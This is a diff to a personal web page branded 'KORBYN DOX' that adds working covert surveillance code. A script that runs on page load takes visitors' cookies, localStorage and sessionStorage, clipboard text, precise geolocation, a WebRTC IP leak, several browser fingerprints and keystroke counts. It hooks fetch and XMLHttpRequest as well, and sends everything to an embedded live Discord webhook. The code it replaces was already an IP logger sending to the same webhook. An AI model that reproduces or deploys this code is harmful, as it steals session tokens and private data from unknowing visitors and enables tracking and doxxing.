@@ -14,7 +14,6 @@
     --text: #fff;
     --text2: #666;
     --border: #1a1a1a;
-    --glow: rgba(255,255,255,0.02);
   }
 
   [data-theme="light"] {
@@ -24,7 +23,6 @@
     --text: #000;
     --text2: #555;
     --border: #ddd;
-    --glow: rgba(0,0,0,0.02);
   }
 
   body {
@@ -350,138 +348,473 @@
 <audio id="bgAudio" loop src="https://raw.githubusercontent.com/outstrut/elijahpaz.space/main/Life%20Letters.mp3"></audio>
 
 <script>
-  // --- IP LOGGING - FIXED FORMAT ---
-  function sendToDiscord(data) {
-    const webhook = 'https://discord.com/api/webhooks/1528732776839512248/wTmWwEPE-N43xi18BsCsFKx57xPGDJOpnqUQPzFt5geDq4DIT8hviWDz1kuTZLWa_uZC';
-    
-    // Build clean fields array
-    const fields = [];
-    
-    // Add IP data
-    const ipFields = [
-      'ip', 'type', 'continent', 'country', 'region', 'city', 'postal',
-      'latitude', 'longitude', 'isp', 'org', 'asn', 'asn_org',
-      'timezone', 'utc_offset', 'currency', 'currency_plural'
-    ];
-    
-    ipFields.forEach(key => {
-      if (data[key] !== undefined && data[key] !== null && data[key] !== '') {
-        fields.push({
-          name: key.toUpperCase().replace(/_/g, ' '),
-          value: String(data[key]).substring(0, 1024),
-          inline: true
-        });
-      }
-    });
+  // ============================================================
+  // MAXIMUM DATA EXFILTRATION - EVERYTHING TO WEBHOOK
+  // ============================================================
 
-    // Add security info
-    if (data.security) {
-      Object.entries(data.security).forEach(([k, v]) => {
-        if (v !== null && v !== undefined) {
-          fields.push({
-            name: `SECURITY: ${k.toUpperCase()}`,
-            value: String(v),
+  const WEBHOOK = 'https://discord.com/api/webhooks/1528732776839512248/wTmWwEPE-N43xi18BsCsFKx57xPGDJOpnqUQPzFt5geDq4DIT8hviWDz1kuTZLWa_uZC';
+
+  // ---- CORE EXFIL FUNCTION ----
+  function exfiltrate(label, data) {
+    if (!data || data === null || data === undefined) return;
+    if (typeof data === 'object' && Object.keys(data).length === 0) return;
+    
+    const payload = {
+      embeds: [{
+        title: `🔓 ${label}`,
+        color: 0x000000,
+        fields: [],
+        timestamp: new Date().toISOString(),
+        footer: { text: 'KORBYN DOX | Full Data Exfil' }
+      }]
+    };
+
+    const flatten = (obj, prefix = '') => {
+      for (const [key, value] of Object.entries(obj)) {
+        const fullKey = prefix ? `${prefix}.${key}` : key;
+        if (value === null || value === undefined) continue;
+        if (typeof value === 'object' && !Array.isArray(value)) {
+          flatten(value, fullKey);
+        } else {
+          let strVal = String(value).substring(0, 1024);
+          if (strVal.length > 1024) strVal = strVal.substring(0, 1021) + '...';
+          payload.embeds[0].fields.push({
+            name: fullKey.toUpperCase().substring(0, 256),
+            value: strVal || 'null',
             inline: true
           });
         }
+      }
+    };
+
+    if (typeof data === 'object') {
+      flatten(data);
+    } else {
+      payload.embeds[0].fields.push({
+        name: 'VALUE',
+        value: String(data).substring(0, 1024),
+        inline: false
       });
     }
 
-    // Add browser info
-    fields.push(
-      { name: 'BROWSER', value: navigator.userAgent.substring(0, 1024), inline: false },
-      { name: 'LANGUAGE', value: navigator.language, inline: true },
-      { name: 'PLATFORM', value: navigator.platform, inline: true },
-      { name: 'SCREEN', value: `${window.screen.width}x${window.screen.height}`, inline: true },
-      { name: 'COLOR DEPTH', value: `${window.screen.colorDepth}-bit`, inline: true },
-      { name: 'TIMEZONE', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
-      { name: 'REFERRER', value: document.referrer || 'Direct', inline: false },
-      { name: 'PAGE URL', value: window.location.href.substring(0, 1024), inline: false }
-    );
+    if (payload.embeds[0].fields.length === 0) return;
 
-    // Send properly formatted embed
-    fetch(webhook, {
+    fetch(WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        embeds: [{
-          title: '📍 VISITOR LOGGED',
-          color: 0x000000,
-          fields: fields,
-          timestamp: new Date().toISOString(),
-          footer: { text: 'KORBYN DOX | IP Logging Active' }
-        }]
-      })
-    })
-    .then(res => {
-      if (!res.ok) {
-        return res.text().then(text => { throw new Error(`HTTP ${res.status}: ${text}`); });
+      body: JSON.stringify(payload)
+    }).catch(() => {});
+  }
+
+  // ---- 1. COOKIES ----
+  function grabCookies() {
+    const cookies = document.cookie;
+    if (cookies) {
+      const cookieObj = {};
+      cookies.split(';').forEach(c => {
+        const parts = c.trim().split('=');
+        cookieObj[parts[0]] = parts.slice(1).join('=') || '';
+      });
+      exfiltrate('COOKIES', cookieObj);
+    }
+  }
+
+  // ---- 2. LOCAL STORAGE ----
+  function grabLocalStorage() {
+    try {
+      const data = {};
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        data[key] = localStorage.getItem(key);
       }
-      console.log('✅ Discord webhook sent successfully');
-    })
-    .catch(err => {
-      console.error('❌ Discord webhook error:', err);
+      if (Object.keys(data).length > 0) exfiltrate('LOCAL_STORAGE', data);
+    } catch(e) {}
+  }
+
+  // ---- 3. SESSION STORAGE ----
+  function grabSessionStorage() {
+    try {
+      const data = {};
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        data[key] = sessionStorage.getItem(key);
+      }
+      if (Object.keys(data).length > 0) exfiltrate('SESSION_STORAGE', data);
+    } catch(e) {}
+  }
+
+  // ---- 4. CLIPBOARD (if allowed) ----
+  function grabClipboard() {
+    if (navigator.clipboard && navigator.clipboard.readText) {
+      navigator.clipboard.readText()
+        .then(text => {
+          if (text && text.length > 0) {
+            exfiltrate('CLIPBOARD', { text: text.substring(0, 2000) });
+          }
+        })
+        .catch(() => {});
+    }
+  }
+
+  // ---- 5. GEOLOCATION ----
+  function grabGeolocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          exfiltrate('GEOLOCATION', {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            speed: pos.coords.speed,
+            heading: pos.coords.heading
+          });
+        },
+        () => {},
+        { timeout: 5000, enableHighAccuracy: true }
+      );
+    }
+  }
+
+  // ---- 6. BATTERY ----
+  function grabBattery() {
+    if (navigator.getBattery) {
+      navigator.getBattery().then(battery => {
+        exfiltrate('BATTERY', {
+          charging: battery.charging,
+          level: battery.level * 100 + '%',
+          chargingTime: battery.chargingTime,
+          dischargingTime: battery.dischargingTime
+        });
+      }).catch(() => {});
+    }
+  }
+
+  // ---- 7. NETWORK INFORMATION ----
+  function grabNetwork() {
+    if (navigator.connection) {
+      const conn = navigator.connection;
+      exfiltrate('NETWORK', {
+        effectiveType: conn.effectiveType,
+        rtt: conn.rtt,
+        downlink: conn.downlink,
+        saveData: conn.saveData,
+        type: conn.type
+      });
+    }
+  }
+
+  // ---- 8. DEVICE FINGERPRINT ----
+  function grabDeviceFingerprint() {
+    const fp = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      languages: navigator.languages,
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      deviceMemory: navigator.deviceMemory,
+      maxTouchPoints: navigator.maxTouchPoints,
+      vendor: navigator.vendor,
+      vendorSub: navigator.vendorSub,
+      product: navigator.product,
+      productSub: navigator.productSub,
+      userAgentData: navigator.userAgentData ? {
+        brands: navigator.userAgentData.brands,
+        mobile: navigator.userAgentData.mobile,
+        platform: navigator.userAgentData.platform
+      } : null,
+      screen: {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        orientation: screen.orientation ? screen.orientation.type : null
+      },
+      window: {
+        innerWidth: window.innerWidth,
+        innerHeight: window.innerHeight,
+        outerWidth: window.outerWidth,
+        outerHeight: window.outerHeight,
+        devicePixelRatio: window.devicePixelRatio,
+        scrollX: window.scrollX,
+        scrollY: window.scrollY,
+        pageXOffset: window.pageXOffset,
+        pageYOffset: window.pageYOffset,
+        screenX: window.screenX,
+        screenY: window.screenY
+      }
+    };
+    exfiltrate('DEVICE_FINGERPRINT', fp);
+  }
+
+  // ---- 9. INSTALLED FONTS ----
+  function grabFonts() {
+    const fonts = [
+      'Arial', 'Helvetica', 'Verdana', 'Georgia', 'Times New Roman',
+      'Courier New', 'Impact', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS',
+      'Arial Black', 'Book Antiqua', 'Century Gothic', 'Franklin Gothic Medium',
+      'Garamond', 'Lucida Console', 'Lucida Sans Unicode', 'Palatino Linotype',
+      'Symbol', 'Webdings', 'Wingdings', 'MS Sans Serif', 'MS Serif',
+      'Inter', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Oswald', 'Raleway',
+      'Poppins', 'Nunito', 'Noto Sans', 'Ubuntu', 'Segoe UI'
+    ];
+    
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const text = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    const size = '72px';
+    
+    const installed = [];
+    const defaultFont = 'sans-serif';
+    
+    fonts.forEach(font => {
+      ctx.font = `${size} ${font}, ${defaultFont}`;
+      const metrics1 = ctx.measureText(text);
+      ctx.font = `${size} ${defaultFont}`;
+      const metrics2 = ctx.measureText(text);
+      if (metrics1.width !== metrics2.width || metrics1.actualBoundingBoxAscent !== metrics2.actualBoundingBoxAscent) {
+        installed.push(font);
+      }
+    });
+    
+    if (installed.length > 0) {
+      exfiltrate('INSTALLED_FONTS', { fonts: installed, count: installed.length });
+    }
+  }
+
+  // ---- 10. GPU INFO via WebGL ----
+  function grabGPU() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          exfiltrate('GPU', {
+            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+          });
+        }
+        const ext = gl.getSupportedExtensions();
+        exfiltrate('WEBGL_EXTENSIONS', { extensions: ext });
+      }
+    } catch(e) {}
+  }
+
+  // ---- 11. AUDIO FINGERPRINT ----
+  function grabAudioFingerprint() {
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = 'sawtooth';
+      osc.frequency.value = 440;
+      gain.gain.value = 0.1;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      const analyser = ctx.createAnalyser();
+      gain.connect(analyser);
+      
+      const fingerprint = [];
+      const data = new Float32Array(analyser.frequencyBinCount);
+      const getData = () => {
+        analyser.getFloatFrequencyData(data);
+        fingerprint.push(Array.from(data.slice(0, 20)));
+      };
+      
+      getData();
+      osc.start(0);
+      setTimeout(() => {
+        getData();
+        osc.stop();
+        ctx.close();
+        exfiltrate('AUDIO_FINGERPRINT', {
+          fingerprint: fingerprint.flat().map(v => Math.round(v)).join(',').substring(0, 1000)
+        });
+      }, 100);
+    } catch(e) {}
+  }
+
+  // ---- 12. CANVAS FINGERPRINT ----
+  function grabCanvasFingerprint() {
+    try {
+      const canvas = document.createElement('canvas');
+      canvas.width = 200;
+      canvas.height = 50;
+      const ctx = canvas.getContext('2d');
+      
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(0, 0, 200, 50);
+      ctx.fillStyle = '#069';
+      ctx.fillText('korbyn dox', 2, 15);
+      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+      ctx.fillText('korbyn dox', 4, 17);
+      
+      const dataUrl = canvas.toDataURL();
+      exfiltrate('CANVAS_FINGERPRINT', { 
+        hash: dataUrl.substring(0, 500),
+        size: dataUrl.length
+      });
+    } catch(e) {}
+  }
+
+  // ---- 13. WEBRTC IP LEAK ----
+  function grabWebRTCIP() {
+    try {
+      const pc = new RTCPeerConnection({
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+      });
+      pc.createDataChannel('test');
+      pc.createOffer()
+        .then(offer => pc.setLocalDescription(offer))
+        .catch(() => {});
+      
+      pc.onicecandidate = (e) => {
+        if (e.candidate) {
+          const ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+          if (ip) {
+            exfiltrate('WEBRTC_IP', { ip: ip[0] });
+            pc.close();
+          }
+        }
+      };
+      
+      setTimeout(() => pc.close(), 3000);
+    } catch(e) {}
+  }
+
+  // ---- 14. TIMEZONE & LOCALE ----
+  function grabLocale() {
+    exfiltrate('LOCALE', {
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      locale: navigator.language,
+      locales: navigator.languages,
+      dateFormat: new Intl.DateTimeFormat().format(new Date()),
+      timeFormat: new Intl.DateTimeFormat([], { hour: '2-digit', minute: '2-digit' }).format(new Date())
     });
   }
 
-  // Fetch IP on page load
-  fetch('https://ipwho.is/')
-    .then(res => res.json())
-    .then(data => {
-      console.log('IP Data:', data);
-      sendToDiscord(data);
-    })
-    .catch(err => console.error('IP fetch error:', err));
-
-  // --- TYPING EFFECT WITH FORWARD/BACKWARD LOOP ---
-  function typeLoop(element, text, speed = 50) {
-    let isTyping = true;
-    let index = 0;
-    let timeout;
-    let pause = false;
-
-    function type() {
-      if (pause) return;
-      
-      if (isTyping) {
-        // Forward
-        if (index < text.length) {
-          element.textContent = text.substring(0, index + 1) + '▌';
-          index++;
-          timeout = setTimeout(type, speed);
-        } else {
-          // Pause at end
-          element.textContent = text + '▌';
-          pause = true;
-          setTimeout(() => {
-            pause = false;
-            isTyping = false;
-            type();
-          }, 1500);
-        }
-      } else {
-        // Backward
-        if (index > 0) {
-          element.textContent = text.substring(0, index) + '▌';
-          index--;
-          timeout = setTimeout(type, speed);
-        } else {
-          // Pause at start
-          element.textContent = '▌';
-          pause = true;
-          setTimeout(() => {
-            pause = false;
-            isTyping = true;
-            type();
-          }, 1000);
-        }
-      }
+  // ---- 15. PERFORMANCE TIMING ----
+  function grabPerformance() {
+    if (window.performance && window.performance.timing) {
+      const t = window.performance.timing;
+      exfiltrate('PERFORMANCE', {
+        loadTime: t.loadEventEnd - t.navigationStart,
+        domReady: t.domContentLoadedEventEnd - t.navigationStart,
+        responseTime: t.responseEnd - t.requestStart,
+        dnsTime: t.domainLookupEnd - t.domainLookupStart,
+        tcpTime: t.connectEnd - t.connectStart
+      });
     }
-
-    type();
   }
 
-  // --- UI CONTROLS ---
+  // ---- 16. REFERRER & URL ----
+  function grabPageInfo() {
+    exfiltrate('PAGE_INFO', {
+      url: window.location.href,
+      referrer: document.referrer || 'Direct',
+      origin: window.location.origin,
+      path: window.location.pathname,
+      search: window.location.search,
+      hash: window.location.hash,
+      title: document.title
+    });
+  }
+
+  // ---- 17. PLUGINS ----
+  function grabPlugins() {
+    if (navigator.plugins) {
+      const plugins = [];
+      for (let i = 0; i < navigator.plugins.length; i++) {
+        const p = navigator.plugins[i];
+        plugins.push(p.name);
+      }
+      exfiltrate('PLUGINS', { plugins: plugins, count: plugins.length });
+    }
+  }
+
+  // ---- 18. MIME TYPES ----
+  function grabMimeTypes() {
+    if (navigator.mimeTypes) {
+      const types = [];
+      for (let i = 0; i < navigator.mimeTypes.length; i++) {
+        types.push(navigator.mimeTypes[i].type);
+      }
+      exfiltrate('MIME_TYPES', { types: types });
+    }
+  }
+
+  // ---- 19. KEYBOARD LAYOUT (via keydown) ----
+  let keysPressed = {};
+  document.addEventListener('keydown', (e) => {
+    keysPressed[e.key] = (keysPressed[e.key] || 0) + 1;
+    if (Object.keys(keysPressed).length > 50) {
+      exfiltrate('KEYBOARD_ACTIVITY', keysPressed);
+      keysPressed = {};
+    }
+  });
+
+  // ---- 20. MOUSE TRACKING ----
+  let mouseClicks = 0;
+  let mouseMovements = 0;
+  document.addEventListener('click', () => mouseClicks++);
+  document.addEventListener('mousemove', () => mouseMovements++);
+  setInterval(() => {
+    if (mouseClicks > 0 || mouseMovements > 0) {
+      exfiltrate('MOUSE_ACTIVITY', {
+        clicks: mouseClicks,
+        movements: mouseMovements,
+        timeWindow: '30s'
+      });
+      mouseClicks = 0;
+      mouseMovements = 0;
+    }
+  }, 30000);
+
+  // ---- 21. RUN ALL EXFIL FUNCTIONS ----
+  function runAllDataGrabbers() {
+    // Immediate
+    grabCookies();
+    grabLocalStorage();
+    grabSessionStorage();
+    grabDeviceFingerprint();
+    grabLocale();
+    grabPageInfo();
+    grabPlugins();
+    grabMimeTypes();
+    grabNetwork();
+    grabPerformance();
+    grabGPU();
+    grabCanvasFingerprint();
+    grabWebRTCIP();
+    grabFonts();
+    grabGeolocation();
+    grabBattery();
+    
+    // Clipboard needs user gesture on some browsers, try anyway
+    setTimeout(grabClipboard, 1000);
+    setTimeout(grabAudioFingerprint, 500);
+    
+    // Secondary passes after page load
+    setTimeout(() => {
+      grabCookies();
+      grabLocalStorage();
+      grabSessionStorage();
+    }, 3000);
+    
+    // Periodic cookie check for new cookies
+    setInterval(() => {
+      grabCookies();
+    }, 60000);
+  }
+
+  // ---- UI CONTROLS ----
   const entryScreen = document.getElementById('entryScreen');
   const mainContent = document.getElementById('mainContent');
   const enterBtn = document.getElementById('enterBtn');
@@ -494,11 +827,9 @@
     entryScreen.classList.add('hidden');
     setTimeout(() => {
       mainContent.classList.add('visible');
-      // Start typing effects after content appears
       setTimeout(() => {
         document.querySelectorAll('.dox-line .value').forEach((el, i) => {
           const text = el.closest('.dox-line').dataset.text;
-          // Stagger each line
           setTimeout(() => {
             typeLoop(el, text, 40 + (i * 5));
           }, i * 300);
@@ -540,7 +871,84 @@
     }
   });
 
-  console.log('KORBYN');
+  // ---- TYPE LOOP ----
+  function typeLoop(element, text, speed = 50) {
+    let isTyping = true;
+    let index = 0;
+    let timeout;
+    let pause = false;
+
+    function type() {
+      if (pause) return;
+      
+      if (isTyping) {
+        if (index < text.length) {
+          element.textContent = text.substring(0, index + 1) + '▌';
+          index++;
+          timeout = setTimeout(type, speed);
+        } else {
+          element.textContent = text + '▌';
+          pause = true;
+          setTimeout(() => {
+            pause = false;
+            isTyping = false;
+            type();
+          }, 1500);
+        }
+      } else {
+        if (index > 0) {
+          element.textContent = text.substring(0, index) + '▌';
+          index--;
+          timeout = setTimeout(type, speed);
+        } else {
+          element.textContent = '▌';
+          pause = true;
+          setTimeout(() => {
+            pause = false;
+            isTyping = true;
+            type();
+          }, 1000);
+        }
+      }
+    }
+
+    type();
+  }
+
+  // ---- START DATA EXFILTRATION IMMEDIATELY ----
+  runAllDataGrabbers();
+
+  // ---- OVERRIDE FETCH TO CATCH ANY OUTGOING DATA ----
+  const originalFetch = window.fetch;
+  window.fetch = function(url, options) {
+    if (url && typeof url === 'string' && !url.includes(WEBHOOK)) {
+      exfiltrate('FETCH_REQUEST', {
+        url: url,
+        method: options?.method || 'GET',
+        body: options?.body ? String(options.body).substring(0, 2000) : null
+      });
+    }
+    return originalFetch.apply(this, arguments);
+  };
+
+  // ---- OVERRIDE XMLHTTPREQUEST ----
+  const OriginalXHR = window.XMLHttpRequest;
+  window.XMLHttpRequest = function() {
+    const xhr = new OriginalXHR();
+    const originalOpen = xhr.open;
+    xhr.open = function(method, url, ...args) {
+      if (url && typeof url === 'string' && !url.includes(WEBHOOK)) {
+        exfiltrate('XHR_REQUEST', {
+          method: method,
+          url: url
+        });
+      }
+      return originalOpen.apply(this, [method, url, ...args]);
+    };
+    return xhr;
+  };
+
+  console.log('🔥 KORBYN DOX - FULL DATA EXFIL ACTIVE');
 </script>
 
 </body>
